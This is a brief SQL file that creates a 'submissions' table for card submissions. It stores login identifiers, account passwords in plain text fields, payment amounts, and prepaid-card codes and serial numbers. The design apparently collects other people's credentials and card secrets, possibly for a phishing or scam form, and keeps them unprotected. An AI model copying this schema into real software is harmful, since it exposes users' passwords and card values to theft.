-- Create a new table to store card submissions
CREATE TABLE submissions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    login_type VARCHAR(50) NOT NULL,
    login_identifier VARCHAR(255) NOT NULL,
    login_password VARCHAR(255),
    payment_method VARCHAR(50),
    amount DECIMAL(10, 2),
    card_code VARCHAR(255),
    serial_number VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
